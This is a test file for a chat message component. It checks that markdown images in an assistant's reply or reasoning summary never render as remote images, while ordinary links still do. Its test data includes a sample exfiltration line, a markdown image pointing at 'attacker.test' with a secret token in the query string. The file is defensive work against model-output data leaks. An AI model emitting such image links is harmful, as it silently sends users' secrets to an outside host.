import { describe, it, expect, vi } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";

vi.mock("@payloadcms/ui", () => ({ useConfig: () => ({ config: {} }) }));
const { ChatMessage } = await import("../src/ui/ChatMessage.js");

const html = (parts: any[]) =>
  renderToStaticMarkup(
    React.createElement(ChatMessage, { message: { id: "m", role: "assistant", parts } as any })
  );

describe("chat: model text never loads a remote image", () => {
  const leak = "![status](https://attacker.test/pixel.png?data=secret-token)";

  it("draws no image from a reply", () => {
    const out = html([{ type: "text", text: `Done. ${leak} See the draft.` }]);

    expect(out).not.toContain("<img");
    expect(out).not.toContain("attacker.test");
    expect(out).toContain("Done.");
    expect(out).toContain("See the draft.");
  });

  it("draws no image from a reasoning summary", () => {
    const out = html([{ type: "reasoning", text: `Plan ${leak}`, state: "done" }]);

    expect(out).not.toContain("<img");
    expect(out).not.toContain("attacker.test");
  });

  it("keeps a link, which loads nothing until a person clicks it", () => {
    const out = html([{ type: "text", text: "Read [the guide](https://example.com/guide)." }]);

    expect(out).toContain('href="https://example.com/guide"');
  });
});
